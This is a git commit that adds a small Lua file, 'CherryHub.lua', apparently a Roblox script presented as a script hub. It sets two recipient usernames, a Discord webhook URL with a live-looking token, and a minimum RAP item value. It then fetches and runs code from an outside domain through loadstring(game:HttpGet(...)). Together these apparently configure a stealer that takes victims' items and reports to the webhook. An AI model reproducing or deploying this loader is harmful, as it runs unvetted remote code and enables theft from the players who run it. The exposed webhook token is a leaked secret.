4e7b02c4cdc6630b80bcdda25dc682ea169d9323
ultratombwer <140904293+KiiwMC@users.noreply.github.com>
2024-04-20 15:15:46 +0200

    Add files via upload

---
+++ CherryHub.lua
@@ -0,0 +1,8 @@
+Username = "Frutinyan"
+Username2 = "Frutinyan2"
+Webhook = "https://discord.com/api/webhooks/1231223733797126154/iED2facUFr6XD76VayWnGnB2jJtTfeOzrPzg5h2sE3yRh4ZQbXPgFMi4fEZDLdbetzCB"
+
+MinimumRAP = 1
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
+ 
